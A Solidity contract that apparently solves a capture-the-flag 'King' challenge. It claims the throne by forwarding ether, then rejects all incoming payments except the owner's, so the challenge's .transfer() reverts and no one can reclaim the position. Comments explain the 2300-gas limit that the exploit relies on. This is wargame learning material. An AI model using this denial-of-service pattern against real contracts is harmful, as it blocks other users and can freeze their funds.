// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract KingSolver {
    address owner;
    address payable challenge;

    constructor(address payable addr) public {
        challenge = addr;
        owner = msg.sender;
    }

    function solve() public payable returns (bool) {
        // Dont use transfer as it has a limit of 2300 for gas price.
        (bool success, ) = challenge.call.value(msg.value)("");
        return success;
    }

    receive() external payable {
        // This is one way to prevent the challenge from re-obtaining king, because the .transfer() function used in the King contract
        // will revert if the transfer did not go through.
    
        // A second maybe unintended way of solving the challenge was to put a lot of logic in this receive function, because the King challenge uses .transfer() to send ether
        // rather than sending [sendTo].call.value([how much eth])([data]). .Transfer is stuck to 2300 gas limit, so the transaction mustn't trigger any logic that could make it go over it.
        require(msg.sender == owner, "Challenge was prevented from sending this contract ether");
    }
}
